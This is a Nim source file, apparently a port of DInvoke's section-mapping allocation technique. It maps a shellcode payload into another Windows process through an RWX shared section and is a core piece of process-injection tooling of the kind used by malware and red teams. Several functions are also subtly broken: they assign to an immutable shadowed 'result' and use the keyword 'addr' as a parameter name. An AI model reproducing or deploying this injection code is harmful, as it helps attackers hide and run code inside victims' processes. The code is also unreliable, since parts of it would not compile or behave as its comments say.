## injection/allocation.nim
## Direct port of DInvoke/Injection/AllocationTechnique.cs
## Base class for allocation techniques + SectionMapAlloc implementation

import std/typetraits
import winim/lean
import../DynamicInvoke/Native

type
  PayloadType* = ref object of RootObj
  
  PICPayload* = ref object of PayloadType
    Payload*: seq[byte]

  PayloadTypeNotSupported* = object of CatchableError

  AllocationTechnique* = ref object of RootObj
    supportedPayloads*: seq[typedesc]

  SectionMapAlloc* = ref object of AllocationTechnique
    localSectionPermissions*: uint32
    remoteSectionPermissions*: uint32
    sectionAttributes*: uint32

  SectionDetails* = object
    baseAddr*: pointer
    size*: uint64

# --- Base AllocationTechnique ---

method IsSupportedPayloadType*(this: AllocationTechnique, payload: PayloadType): bool {.base.} =
  ## Checks if payload type is supported
  false

method DefineSupportedPayloadTypes*(this: AllocationTechnique) {.base.} =
  ## Sets supported payload types. Override in subclasses.
  discard

method Allocate*(this: AllocationTechnique, payload: PayloadType, process: Process, address: pointer): pointer {.base.} =
  ## Allocate payload to target process at specified address
  # Use reflection to call overload matching payload type
  for supportedType in this.supportedPayloads:
    if payload of supportedType:
      # Nim doesn't have runtime reflection like C#, so we dispatch manually
      raise newException(PayloadTypeNotSupported, "Use specific Allocate overload for " & $payload.type)
  raise newException(PayloadTypeNotSupported, $payload.type)

method Allocate*(this: AllocationTechnique, payload: PayloadType, process: Process): pointer {.base.} =
  ## Allocate payload to target process at any address
  this.Allocate(payload, process, nil)

# --- SectionMapAlloc ---

proc newSectionMapAlloc*(localPerms: uint32 = PAGE_EXECUTE_READWRITE, 
                         remotePerms: uint32 = PAGE_EXECUTE_READWRITE, 
                         atts: uint32 = SEC_COMMIT): SectionMapAlloc =
  ## Constructor with options
  result = SectionMapAlloc(
    localSectionPermissions: localPerms,
    remoteSectionPermissions: remotePerms,
    sectionAttributes: atts
  )
  result.DefineSupportedPayloadTypes()

method DefineSupportedPayloadTypes*(this: SectionMapAlloc) =
  ## Sets supported payload types
  this.supportedPayloads = @[PICPayload]

method IsSupportedPayloadType*(this: SectionMapAlloc, payload: PayloadType): bool =
  ## Checks if payload type is supported
  for t in this.supportedPayloads:
    if payload of t:
      return true
  false

proc CreateSection(size: uint64, allocationAttributes: uint32): pointer =
  ## Creates a new Section
  var sectionHandle: pointer = nil
  var maxSize = size
  
  let result = NtCreateSection(
    sectionHandle, 0x10000000'u32, nil, maxSize,
    PAGE_EXECUTE_READWRITE, allocationAttributes, nil
  )
  if result < 0:
    return nil
  result = sectionHandle

proc MapSection(procHandle: pointer, sectionHandle: pointer, protection: uint32, 
                addr: pointer, sizeData: uint64): SectionDetails =
  ## Maps a view of a section to the target process
  var baseAddr = addr
  var size = sizeData
  
  let disp: uint32 = 2 # ViewShare
  let alloc: uint32 = 0
  
  let result = NtMapViewOfSection(
    sectionHandle, procHandle, baseAddr, nil, nil,
    size, disp, alloc, protection
  )
  
  result = SectionDetails(baseAddr: baseAddr, size: sizeData)

proc UnmapSection(hProc: pointer, baseAddr: pointer): NTSTATUS =
  ## Unmaps a view of a section from a process
  NtUnmapViewOfSection(hProc, baseAddr)

method Allocate*(this: SectionMapAlloc, payload: PICPayload, process: Process, preferredAddress: pointer): pointer =
  ## Allocate PIC payload to target process using section mapping
  let procHandle = process.Handle
  
  # Create section to hold payload
  let sectionAddress = CreateSection(payload.Payload.len.uint64, this.sectionAttributes)
  
  # Map view into current process with RW permissions
  var details = MapSection(GetCurrentProcess(), sectionAddress, 
    this.localSectionPermissions, nil, payload.Payload.len.uint64)
  
  # Copy shellcode to local view
  copyMem(details.baseAddr, payload.Payload[0].addr, payload.Payload.len)
  
  # Unmap from current process
  discard UnmapSection(GetCurrentProcess(), details.baseAddr)
  
  # Map view to target process
  var newDetails: SectionDetails
  if preferredAddress!= nil:
    newDetails = MapSection(procHandle, sectionAddress, 
      this.remoteSectionPermissions, preferredAddress, payload.Payload.len.uint64)
  else:
    newDetails = MapSection(procHandle, sectionAddress, 
      this.remoteSectionPermissions, nil, payload.Payload.len.uint64)
  
  result = newDetails.baseAddr

method Allocate*(this: SectionMapAlloc, payload: PayloadType, process: Process): pointer =
  ## Override for generic PayloadType
  if not this.IsSupportedPayloadType(payload):
    raise newException(PayloadTypeNotSupported, $payload.type)
  this.Allocate(PICPayload(payload), process, nil)

method Allocate*(this: SectionMapAlloc, payload: PayloadType, process: Process, address: pointer): pointer =
  ## Override for generic PayloadType with address
  if not this.IsSupportedPayloadType(payload):
    raise newException(PayloadTypeNotSupported, $payload.type)
  this.Allocate(PICPayload(payload), process, address)
